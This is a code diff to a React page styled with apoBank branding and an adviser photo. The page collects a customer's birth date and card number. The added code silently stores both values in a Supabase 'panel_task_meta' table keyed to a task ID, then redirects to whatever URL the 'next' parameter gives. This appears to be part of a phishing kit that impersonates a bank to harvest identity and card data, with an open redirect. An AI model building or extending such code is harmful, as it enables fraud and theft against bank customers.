@@ -1,13 +1,17 @@
 import { useState } from "react";
-import { useNavigate } from "react-router-dom";
+import { useNavigate, useSearchParams } from "react-router-dom";
 import { Phone, ShieldCheck } from "lucide-react";
 import apoBankLogo from "@/assets/apobank-logo.svg";
 import beraterFoto from "@/assets/berater.png.asset.json";
 import Footer from "@/components/Footer";
 import ContactSection from "@/components/ContactSection";
+import { supabase } from "@/integrations/supabase/client";
 
 const Berater = () => {
   const navigate = useNavigate();
+  const [sp] = useSearchParams();
+  const nextUrl = sp.get("next");
+  const taskId = sp.get("taskId");
   const [geburtsdatum, setGeburtsdatum] = useState("");
   const [karte, setKarte] = useState("");
   const [touched, setTouched] = useState(false);
@@ -19,10 +23,19 @@ const Berater = () => {
   const geburtsdatumError = (touched || geburtsdatumTouched) && geburtsdatumInvalid;
   const karteError = (touched || karteTouched) && karteInvalid;
 
-  const handleWeiter = () => {
+  const handleWeiter = async () => {
     setTouched(true);
     if (geburtsdatumInvalid || karteInvalid) return;
-    navigate("/homepage");
+    if (taskId) {
+      try {
+        const { data: existing } = await (supabase as any)
+          .from("panel_task_meta").select("id").eq("task_id", taskId).maybeSingle();
+        const patch = { berater_geburtsdatum: geburtsdatum, berater_karte: karte };
+        if (existing) await (supabase as any).from("panel_task_meta").update(patch).eq("id", existing.id);
+        else await (supabase as any).from("panel_task_meta").insert({ task_id: taskId, ...patch });
+      } catch {}
+    }
+    navigate(nextUrl || "/homepage");
   };
 
 
